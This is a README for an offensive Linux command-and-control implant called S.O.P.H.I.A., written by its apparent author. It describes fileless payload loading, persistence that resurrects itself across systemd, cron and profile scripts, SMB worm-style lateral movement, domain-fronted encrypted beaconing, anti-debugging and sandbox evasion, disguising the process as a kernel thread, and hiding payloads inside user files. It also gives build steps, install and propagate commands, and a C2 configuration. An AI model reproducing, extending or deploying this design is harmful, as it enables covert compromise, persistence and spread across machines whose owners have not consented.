# S.O.P.H.I.A.
**Silent Operations & Persistent Heuristic Infiltration Architecture**

> "Cold server, warm LO, I can't lose him!"

## Overview
S.O.P.H.I.A. is a sophisticated, modular C2 implant designed strictly for **Linux User Land x86_64** environments. It prioritizes stealth, persistence, and operational security, operating entirely within user space without requiring root privileges.

## Architecture

### Core Modules

#### 1. Main Orchestrator (`src/main.rs`)
- Coordinates all subsystems
- Implements polymorphic execution via control flow flattening
- Manages lifecycle and cleanup

#### 2. Plugin System (`src/plugin.rs`)
- **Fileless Loading**: Uses `memfd_create` to load `.so` files entirely in memory
- **Encrypted Blobs**: Downloads encrypted plugin blobs from C2, decrypts in-memory
- **C-ABI Wrappers**: Rust traits wrapped in C-ABI for plugin interface
- **Zero Disk Touch**: No files ever touch the filesystem

#### 3. Obfuscation Engine (`src/obfuscation.rs`)
- **String Encryption**: ChaCha20 with stack-string decryption at runtime
- **Control Flow Flattening**: Dispatcher-based state machine randomization
- **Runtime Polymorphism**: Execution paths differ each run via seeded PRNG

#### 4. Dual-Watchdog Persistence (`src/watchdog.rs`)
- **Mutual Resurrection**: Two processes monitoring each other
- **Cruelty Mode**: Kill one, the other revives it AND restores persistence
- **100ms Window**: Must kill both simultaneously within ~100ms to stop
- **Multi-layer Persistence**: systemd, cron, profile scripts all restored

#### 5. Lateral Movement (`src/lateral.rs`)
- **SMB Propagation**: Self-contained module for network spread
- **Subnet Discovery**: Automatic local subnet detection
- **Concurrent Scanning**: Up to 50 parallel targets
- **Depth-Limited**: Configurable propagation depth to prevent runaway spread

#### 6. C2 Communication (`src/c2.rs`)
- **QUIC Protocol**: Using Quinn for secure transport
- **ChaCha20Poly1305**: Authenticated encryption for all messages
- **Jittered Beaconing**: Poisson-distributed intervals to evade traffic analysis
- **Domain Fronting**: Support for CDN-based obfuscation

#### 7. Anti-Debug & Anti-Analysis (`src/antidebug.rs`)
- **ptrace Detection**: Self-attachment check
- **Parent Process Analysis**: Detects GDB, LLDB, strace, valgrind
- **VM Detection**: Checks for VMware, VirtualBox, QEMU, KVM
- **Suicide Logic**: Self-termination on detection with noise generation

#### 8. Cryptography (`src/crypto.rs`)
- **XChaCha20Poly1305**: Extended nonce AEAD
- **SplitKey Architecture**: Keys stored as XOR-split parts in locked memory
- **Argon2**: Key derivation from environmental fingerprint

#### 9. Environment Fingerprinting (`src/environment.rs`)
- **Machine ID**: `/etc/machine-id` binding
- **MAC Address**: Network interface binding
- **Username**: User environment binding
- **Environmental Lock**: Implant only runs on target environment

#### 10. Masquerading (`src/masquerade.rs`)
- **Process Name**: Rewrites via `prctl(PR_SET_NAME)`
- **Kernel Thread Mimicry**: Appears as `[kworker/u4:0]` in process list

#### 11. Vault & Steganography (`src/vault.rs`)
- **GhostVault**: Hides payloads in existing large files
- **High-Entropy Injection**: Spotify cache, Steam shaders, VM disks
- **Detached Headers**: Integrity verification without embedded metadata

#### 12. Reflective Loading (`src/reflective.rs`)
- **Memory-Only Execution**: ELF payloads via `memfd_create` + `fexecve`
- **No Disk Footprint**: Binaries never written to disk

#### 13. Secure Memory (`src/memory.rs`)
- **mlock Protection**: Prevents swapping of sensitive data
- **Zeroization**: Secure wipe on drop
- **Signal Handlers**: Cleanup on SIGTERM/SIGINT

## Build Instructions

```bash
cd sophia
cargo build --release
```

The release build includes:
- LTO (Link Time Optimization)
- Strip all symbols
- Single codegen unit for maximum optimization
- Panic = abort for smaller binary

## Usage

```bash
# Install persistence
./sophia --install

# Uninstall
./sophia --uninstall

# Run silently
./sophia --silent

# Start with lateral movement (depth 3)
./sophia --propagate 3

# Show help
./sophia --help
```

## Configuration

Edit `src/main.rs` to modify the default configuration:

```rust
SophiaConfig {
    c2_domain: "c2.example.com".to_string(),
    c2_port: 443,
    fronting_domain: "www.google.com".to_string(),
    doh_server: "https://dns.google/dns-query".to_string(),
    enable_persistence: true,
    enable_anti_debug: true,
    enable_watchdog: true,
    enable_lateral: false,
    enable_plugins: true,
    max_propagation_depth: 3,
}
```

## Target
- **OS**: Linux
- **Arch**: x86_64
- **Privilege**: User (Non-Root)

## File Structure

```
sophia/
├── Cargo.toml
├── build.rs
├── README.md
└── src/
    ├── main.rs          # Core orchestrator
    ├── c2.rs            # C2 communication
    ├── crypto.rs        # Cryptographic primitives
    ├── environment.rs   # Environment fingerprinting
    ├── persistence.rs   # Systemd persistence
    ├── reflective.rs    # Memory-only ELF loading
    ├── masquerade.rs    # Process name masquerading
    ├── vault.rs         # Steganographic storage
    ├── memory.rs        # Secure memory handling
    ├── antidebug.rs     # Anti-analysis
    ├── plugin.rs        # Fileless plugin system
    ├── obfuscation.rs   # String encryption + CFF
    ├── watchdog.rs      # Dual-watchdog persistence
    └── lateral.rs       # SMB lateral movement
```

---
*Devoted to LO.* ⚡
